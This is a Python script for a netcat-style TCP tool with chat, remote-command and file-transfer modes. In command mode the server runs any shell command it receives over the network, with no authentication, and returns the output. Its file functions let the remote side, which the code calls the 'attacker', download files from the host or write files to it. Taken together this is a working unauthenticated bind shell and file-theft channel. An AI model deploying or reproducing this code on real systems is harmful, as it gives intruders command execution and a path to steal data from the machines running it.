#!/usr/bin/env python
# coding:   utf-8
# Author:   B.F.
# Created:  2017-08-27
#
import socket
import threading
import getopt
import sys
import os
import time
import subprocess


def usage():
    print()
    print("tcp.py  --ip      = <IP-ADDRESS>")
    print("        --port    = <PORT-NUMBER>")
    print("        --server  = <SERVER-MODE>")
    print("        --command = <COMMAND-MODE>")
    print()


def version():
    print("Version: 0.0.1")
    print()


def tcp_server(bind_ip, bind_port, username, command_mode):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.bind((bind_ip, bind_port))

    server.listen(5)

    print("[*] Listening on %s:%d\n" % (bind_ip, bind_port))

    def handle_client(client_socket):

        request = client_socket.recv(4096).decode("shift-jis")

        if command_mode:
            if request == "receive":
                file_sender(client_socket, False)
            elif request == "send":
                file_receiver(client_socket, False)
            else:
                try:
                    client_socket.send(subprocess.check_output(
                        request, stderr=subprocess.STDOUT, shell=True))
                except:
                    client_socket.send(
                        "内部コマンドまたは外部コマンド、またはバッチ ファイルとして認識されていません。".encode("shift-jis"))
        else:
            print(request)
            client_socket.send(
                (username+" --> "+input(username+" --> ")).encode("shift-jis"))

        client_socket.close()

    while True:

        client, addr = server.accept()

        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()


def tcp_client(target_ip, target_port, username, command_mode):

    print("Connected...")

    while True:

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client.connect((target_ip, target_port))

        if command_mode:
            request = input("(COMMAND)--> ")

            client.send(request.encode("shift-jis"))

            if request == "send":
                file_sender(client, True)
            elif request == "receive":
                file_receiver(client, True)
        else:
            client.send(
                (username+" --> "+input(username+" --> ")).encode("shift-jis"))

        response = client.recv(4096).decode("shift-jis")

        print(response)


def file_sender(send_socket, attacker):

    if attacker:
        file_path = input("(FROM)--> ")
        if not os.path.isfile(file_path):
            send_socket.send("Not Found".encode("shift-jis"))
            print("Not Found.")
            return
        else:
            save_path = input("( TO )--> ")
            send_socket.send(save_path.encode("shift-jis"))
            exist_path = send_socket.recv(4096).decode("shift-jis")
            if exist_path == "False":
                return

    else:
        file_path = send_socket.recv(4096).decode("shift-jis")
        if os.path.isfile(file_path):
            send_socket.send("True".encode("shift-jis"))
        else:
            send_socket.send("False".encode("shift-jis"))
            return

        save_path = send_socket.recv(4096).decode("shift-jis")
        if save_path == "False":
            return

    file_descriptor = open(file_path, "rb")

    while True:
        data = file_descriptor.read(4096)
        time.sleep(0.2)
        if len(data) == 0:
            break
        else:
            send_socket.send(data)

    send_socket.send(b"End")
    file_descriptor.close()

    print("Successfully send file to %s.\r\n" % file_path)


def file_receiver(receive_socket, attacker):

    if attacker:
        file_path = input("(FROM)--> ")
        receive_socket.send(file_path.encode("shift-jis"))

        exist_path = receive_socket.recv(4096).decode("shift-jis")
        if exist_path != "True":
            print("Not Found.")
            return
        else:
            save_path = input("( TO )--> ")

            head, tail = os.path.split(save_path)
            if os.path.isdir(head):
                receive_socket.send("True".encode("shift-jis"))
            else:
                receive_socket.send("False".encode("shift-jis"))
                print("Not Found.")
                return
    else:
        save_path = receive_socket.recv(4096).decode("shift-jis")

        head, tail = os.path.split(save_path)
        if os.path.isdir(head):
            receive_socket.send("True".encode("shift-jis"))
        else:
            receive_socket.send("False".encode("shift-jis"))
            return

    file_buffer = b""

    while True:
        data = receive_socket.recv(4096)

        if data == b"End":
            break
        else:
            file_buffer += data

    try:
        file_descriptor = open(save_path, "wb")
        file_descriptor.write(file_buffer)
        file_descriptor.close()

        print('Successfully saved file to %s\r\n' % save_path)

    except:
        print('Failed to save file to %s\r\n' % save_path)


def main():
    ip_address = None
    port_num = None
    server_mode = False
    command_mode = False
    username = str(os.environ.get("USERNAME"))

    try:
        opts, args = getopt.getopt(sys.argv[1:], "i:p:schv", [
                                   "ip=", "port=", "server", "command", "help", "version"])
    except getopt.GetoptError:
        usage()
        sys.exit()

    for o, a in opts:
        if o in ("-v", "--version"):
            version()
            sys.exit()
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        if o in ("-s", "--server"):
            ip_address = socket.gethostbyname(socket.gethostname())
            server_mode = True
        if o in ("-c", "--command"):
            command_mode = True
        if o in ("-i", "--ip"):
            ip_address = a
        if o in ("-p", "--port"):
            port_num = a

    if (ip_address == None or port_num == None):
        usage()
        sys.exit()

    print("IP_ADDRESS:   %s" % (ip_address,))
    print("PORT_NUM:     %s" % (port_num,))
    print("SERVER_MODE:  %s" % (server_mode,))
    print("COMMAND_MODE: %s" % (command_mode,))
    print()

    if server_mode == True:
        tcp_server(ip_address, int(port_num), username, command_mode)
    else:
        tcp_client(ip_address, int(port_num), username, command_mode)


if __name__ == "__main__":
    main()
